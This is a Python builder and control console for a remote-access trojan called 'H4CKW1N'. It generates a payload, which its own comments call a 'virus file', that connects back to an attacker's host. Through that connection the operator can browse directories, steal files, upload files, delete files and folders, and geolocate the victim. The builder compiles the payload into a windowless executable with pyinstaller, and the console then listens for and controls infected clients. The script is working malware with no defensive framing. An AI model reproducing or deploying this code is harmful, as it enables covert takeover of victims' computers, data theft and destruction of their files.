#!/usr/bin/env python3
import sys
import os
import socket
import _thread
import time
import shutil

if os.geteuid() != 0:
	sys.exit("Run as Root User")

# color
green = '\033[1;32;1m'
white = '\033[1;37;0m'
yellow = '\033[1;33;1m'
red = '\033[1;31;1m'

os.system('clear')
print("""{green}
H4CKW1N""")
print("""{green}
[*] Developer => Lytroths
[*] Country   => Greece
[*] github    => https://github.com/lytroths{white}
-------------------****-------------------

    """)

print(f"{red}This program need pyinstaller!")
print("If you don't have pyinstaller \nplease install pyinstaller first")
print("_____________________________________\n")

hostl = input(f"{yellow}[+]Enter Host To Connect From Client ")
portl = int(input("[+]Enter Port To Connect From CLient "))

hostt = input("[*]Enter Host To Bind ")
portt = int(input("[*]Enter Port To Bind "))

fn = input("[+]Enter File Name To Create: ")
ft = (".py") # file type
print(white)
fnn = fn + ft
# folder fisrt

# file creating
f = open(fnn, "w+")

f.write(f"""
hostvar = "{hostl}"
portvar = int("{portl}")
""")    # adding var

# virus file
f.write("""
import socket
import os
import sys
import platform
import time
from random import random
import shutil
import requests

s = ''

def mainthing():


	while True:

	    command1 = s.recv(999999)
	    command = command1.decode('utf-8')

	    if command[:2] == 'cd':
	        dirtoch = command[3:]
	        if os.path.isdir(dirtoch):
	            os.chdir(dirtoch)
	            s.send(bytes(os.getcwd(), 'utf-8'))
	        else:
	            s.send(bytes('Dir not found [cd command unable]', 'utf-8'))

	    elif command == 'pwd':
	        s.send(bytes(os.getcwd(), 'utf-8'))

	    elif command[:5] == 'mkdir':
	        os.mkdir(command[6:])

	    elif command == 'text.':
	        message1 = s.recv(99999)
	        message = message1.decode('utf-8')

	        file_name_msg = s.recv(10000)
	        file_name_msg = file_name_msg.decode('utf-8')

	        f_type = '.txt'

	        final_name = file_name_msg + f_type
	        f = open(final_name, "w+")
	        f.write(message)
	        f.close()

	    elif command == 'show dir':
	        show_dir = os.listdir()
	        show_dir = str(show_dir)
	        s.send(show_dir.encode('utf-8'))

	    elif command[:15] == 'show custom dir':
	        custom_dir = command[16:]
	        show_dir = os.listdir(custom_dir)
	        show_dir = str(show_dir)
	        s.send(show_dir.encode('utf-8'))

	    elif command == 'system platform':
	        sys_plat = sys.platform
	        ps = platform.system()

	        sys_plat = str(sys_plat)
	        s.send(sys_plat.encode('utf-8'))

	        time.sleep(1)
	        s.send(ps.encode('utf-8'))

	      
	        

	    # elif command[:4] == 'link': this fun only work when you run TrojanP on 
		# window
	       # linktoopen = command[5:]
	       # os.system(f'start iexplore.exe {linktoopen}')

	    elif command[:8] == 'download':
	        filename = command[9:]
	        if os.path.isdir(filename) or os.path.isfile(filename):
	            filepath = os.getcwd()
	            final = filepath + '/' + filename
	            file = open(final, "rb")
	            data = file.read()
	            s.send(data)
	        else:
	            messagenull = 'null'
	            s.send(messagenull.encode())

	    elif command == 'send':
	        recv_file = s.recv(100000)
	        name = s.recv(1024)

	        f = open(name, 'wb')
	        f.write(recv_file)
	        f.close()

	    elif command[:5] == 'rm -f':
	        delete_f = command[6:]
	        if os.path.isfile(delete_f):
	            os.remove(delete_f)
	            msg = 'File Delete Successfully!'
	            s.send(msg.encode('utf-8'))
	        else:
	            msg = 'File Not Found!'
	            s.send(msg.encode('utf-8'))

	    elif command[:5] == 'rm -d':
	        delete_d = command[6:]
	        if os.path.isdir(delete_d):
	            shutil.rmtree(delete_d)
	            msg = 'Dir Delete Successfully!'
	            s.send(msg.encode('utf-8'))
	        else:
	            msg = 'Dir Not Found!'
	            s.send(msg.encode('utf-8'))

	    elif command == 'location':
	        response = requests.get('http://ipinfo.io').content

	        r = str(response, 'utf-8')
	        s.send(bytes(r, 'utf-8'))

	    elif command == 'close':
	        s.close()
	        exit()


	    elif command == 'get ip':
            	host_name = socket.gethostname()
            	hostip = socket.gethostbyname(host_name)
            	p_ip = requests.get('https://api.ipify.org').text
            	s.send(bytes(host_name, 'utf-8'))
            	time.sleep(1)
            	s.send(bytes(hostip, 'utf-8'))
            	time.sleep(1)
            	s.send(bytes(p_ip, 'utf-8'))

def connection():
	global s
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating socket
		host = hostvar
		port = portvar

		while True:
			s.connect((host, port))
			mainthing()

	except socket.error:
		time.sleep(3)
		return connection()

connection()

""")

# end of virus file


#####################################################################################
f.close()
print("[!]Making exe file -----------------")
os.system(f"pyinstaller --onefile -w {fnn}")


time.sleep(3)
# exe file
exemv = fn + '.exe'
dirl = os.getcwd()

# delete unuse file

shutil.move(f'dist/{fn}', f'{dirl}/{fn}')
os.remove(f'{fn}.spec')
os.remove(fnn)



###### console  #######

print("----------------------------------------------------------------------")
# starting
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating socket
host = hostt
port = portt

# bind and socket connection
s.bind((host, port))
s.listen(5)
print(f"{green}Server is waiting for connection......")

while True:
    server, adr = s.accept()
    print(f'Client {adr} is Connected!')

    # start hacking
    user = ''
    while user != 'exit':

        user = input(str("Command>"))

        if user == 'help':
            print("""
get ip 		     :	Get ip of client device and host name.
cd <dir>	     :	Change dir.
pwd 		     :	Show current dir location.
mkdir <name>	     :	Make dir.
text. 		     :	Make a simple text file with you custom message in it on cient device.
show dir	     :	Show dir and files in current dir.
show custom dir <dir>:	Show dir and files from custom dir.
clear		     :	Clear your terminal.
system platform      : 	Show system platform of client device.
download <file/dir>  :	To download files or dir Note: only for now dir.
send <file>	     :	Send file or dir to target device.
send -p <path>	     :	Send file or dir to target device from other dir. Example: send -p location_of_file/hack.py
rm -f <file>	     :	delete a file.
rm -d <dir>	     :	delete a folder or dir.
location             :  Show location of Client Device by IP.
close                :  Close the connection.


				""")
            time.sleep(1)

        if user == 'clear':
            if sys.platform in ["linux", "linux2"]:
                os.system('clear')
                time.sleep(1)
            else:
                os.system('cls')
                time.sleep(1)

        elif user == 'get ip':
            server.send(bytes('get ip', 'utf-8'))
            print("Processing[+]")
            host_name = server.recv(9999)
            time.sleep(1)
            ip_client = server.recv(1024)
            time.sleep(1)
            p_ip = server.recv(1024)


            print(host_name.decode('utf-8'))
            time.sleep(1)
            print(ip_client.decode('utf-8'))
            time.sleep(1)
            print(p_ip.decode('utf-8'))


        elif user[:2] == 'cd':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)

        elif user == 'pwd':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)
        elif user == 'close':
            server.send(user.encode())
            print("Disconnected from Client!")

        elif user[:5] == 'mkdir':
            server.send(user.encode())
            time.sleep(1)

        elif user == 'text.':
            server.send(user.encode())

            message = input('Type a message: ')
            server.send(message.encode())

            name_file = input('Enter File Name to save that message as txt file: ')
            server.send(name_file.encode())
            time.sleep(1)

        elif user == 'show dir':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)

        elif user[:15] == 'show custom dir':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)

        elif user == 'system platform':
            server.send(user.encode())
            time.sleep(1)

            result = server.recv(9999)
            result2 = server.recv(9999)  # another

            print(result.decode())
            time.sleep(1)
            print(result2.decode())
            time.sleep(1)

        elif user == 'location':
        	print("Processing[+]")
        	server.send(user.encode())
        	msg = server.recv(9999)

        	time.sleep(1)
        	print(msg.decode('utf-8'))


        #elif user[:4] == 'link':
           # server.send(user.encode())
            #time.sleep(1)

        elif user[:8] == 'download':
            os.chdir('save_file')
            server.send(user.encode())
            recv_file = server.recv(100000)
            decoderecv = recv_file.decode()
            print(f"file save at {dirl}/save_file")
            os.chdir(dirl)
            if decoderecv == 'null':
                print('File or Dir not found! [Unable to download]')
            else:
                filename = input('Please Enter a File Name to save file: ')
                print('File downloading..')
                newfile = open(filename, "wb")
                newfile.write(recv_file)
                newfile.close()
                print('file download successfully!')
                time.sleep(1)

        elif user[:4] == 'send':
            filee = user[5:]
            if os.path.isdir(filee) or os.path.isfile(filee):
                server.send(bytes('send', 'utf-8'))
                f = open(filee, "rb")
                data = f.read()
                server.send(data)

                name = input("Enter file name to save(on client device note: Enter name with a file type): ")
                server.send(name.encode('utf-8'))
                print('File send successfully!')
            else:
                print("File or dir not found! [send command ubable]")

        elif user[:5] == "rm -f":
            server.send(user.encode('utf-8'))
            rst = server.recv(1024)
            print(rst.decode('utf-8'))

        elif user[:5] == "rm -d":
        	server.send(user.encode('utf-8'))
        	rst = server.recv(1024)
        	print(rst.decode('utf-8'))
        	
        print(white)
